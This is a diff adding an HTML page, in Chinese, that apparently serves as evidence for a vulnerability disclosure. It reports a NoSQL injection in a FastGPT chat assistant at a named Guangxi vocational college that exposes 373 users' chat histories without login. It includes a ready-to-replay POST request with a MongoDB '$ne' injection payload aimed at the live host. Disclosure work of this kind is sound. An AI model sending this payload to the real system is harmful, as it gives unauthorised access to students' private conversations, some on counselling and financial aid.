@@ -1,0 +1,47 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><style>
+body { font-family: "Microsoft YaHei", sans-serif; margin: 0; background: #fff; color: #1a1a2e; }
+.wrap { max-width: 1160px; margin: 0 auto; padding: 26px 30px; }
+h1 { font-size: 21px; margin: 0 0 6px; }
+h2 { font-size: 16px; border-left: 4px solid #c0392b; padding-left: 10px; margin: 18px 0 10px; }
+.sub { color: #666; font-size: 13px; }
+.kv { display: grid; grid-template-columns: 150px 1fr; row-gap: 7px; font-size: 13.5px; }
+.kv b { color: #555; }
+code, pre { background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 6px; font-family: Consolas, monospace; }
+pre { padding: 12px; font-size: 12.5px; white-space: pre-wrap; word-break: break-all; }
+table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+th { background: #2d3a4a; color: #fff; padding: 7px 9px; text-align: left; }
+td { border-bottom: 1px solid #e5e8ec; padding: 6px 9px; vertical-align: top; }
+tr:nth-child(even) td { background: #fafbfc; }
+.tt { font-weight: 600; }
+.tm { color: #777; font-family: Consolas, monospace; font-size: 11.5px; }
+.badge { display: inline-block; background: #fdecea; color: #c0392b; border-radius: 4px; padding: 0 6px; font-size: 10.5px; margin-left: 5px; }
+.stat { display: flex; gap: 12px; margin: 10px 0; }
+.stat div { flex: 1; background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 8px; padding: 10px; text-align: center; }
+.stat b { display: block; font-size: 22px; color: #c0392b; }
+.harm li { margin: 6px 0; font-size: 13.5px; line-height: 1.55; }
+.foot { color: #999; font-size: 11.5px; padding-top: 10px; }
+</style></head><body><div class="wrap">
+<h1>漏洞危害补充证明 — 未授权访问高校 AI 平台全部用户聊天记录</h1>
+<div class="sub">目标：广西工商职业技术学院（ai.gxgsxy.edu.cn） · FastGPT NoSQL 注入（CVE-2026-79483 同类） · 取证 2026-10-09 16:40 · 发现人 indifference108</div>
+
+<h2>一、漏洞与目标基本信息</h2>
+<div class="kv">
+<b>受影响单位</b><span>广西工商职业技术学院（gxgsxy.edu.cn，公办高职院校）</span>
+<b>漏洞系统</b><span>FastGPT 智能问答助手（学生事务问答：证明打印/请假/奖助学金/心理咨询等）</span>
+<b>漏洞类型</b><span>NoSQL 注入（MongoDB 查询注入）→ 未授权访问全部用户聊天记录（CWE-943/CWE-862）</span>
+<b>漏洞接口</b><span><code>POST /api/core/chat/getHistories</code>（无需登录、无需凭证，公网匿名可发）</span>
+</div>
+<div class="stat">
+<div><b>373</b><span>未授权可读聊天记录</span></div>
+<div><b>5</b><span>受影响业务应用</span></div>
+<div><b>0</b><span>所需权限/凭证</span></div>
+</div>
+<h2>二、验证请求（可 1:1 复现）</h2>
+<pre>POST https://ai.gxgsxy.edu.cn/api/core/chat/getHistories HTTP/1.1
+Host: ai.gxgsxy.edu.cn
+Content-Type: application/json
+
+{"shareId": {"$ne": ""}, "outLinkUid": {"$ne": ""}, "offset": 0, "pageSize": 50}</pre>
+<div class="sub">响应 HTTP 200，返回 <b>total = 373</b> 条，翻页全部取回 373 条。匿名用户本无权访问其中任何一条。</div>
+<div class="foot">图1/4 · 漏洞基本信息与可复现请求包</div>
+</div></body></html>
